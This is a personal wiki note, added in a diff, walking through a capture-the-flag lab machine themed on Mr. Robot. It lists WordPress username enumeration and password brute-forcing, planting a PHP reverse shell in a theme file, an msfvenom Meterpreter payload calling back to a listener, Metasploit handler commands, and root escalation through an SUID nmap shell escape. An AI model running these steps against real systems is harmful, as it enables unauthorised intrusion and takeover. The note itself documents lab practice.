@@ -1,0 +1,42 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-17T12:33:40-04:00
+
+====== mr.robot ======
+Created Sunday 17 May 2020
+
+1st key on robots.txt
+
+..wpsscan to find username as this is wordpresssite
+..wpsscan to burteforce password after username found
+   after password found edit 404.php theme to uplaod php reverse shell code
+
+	   like....
+
+
+Or ypu can run wordess press admin shell from msfconsole (mine get  issue with it so i am using another method)..
+
+1.msfvenom -p php/meterpreter/reverse_tcp lhost=10.9.10.192 lport=4444 -f  raw
+
+2.run 404.php page
+
+3..open msfconse
+		 ---- use exploit/multi/handler
+		-----set payload php/meterpreter/reverse_tcp 
+		 ---- set lhost and port to yours (same as msfvenom)
+		 --run
+		 --shell
+		---python -c 'import pty; pty.spawn("/bin/bash")'
+		--su robot  (you have to crack the password first from password.raw-md5)
+
+for 3rd key
+
+--find  [[/  -perm]] -u=s -type f 2>/de/null
+
+nmap is presnet
+-----nmap --interactive
+	   !sh
+	  cd [[/root]]
+      
+
+
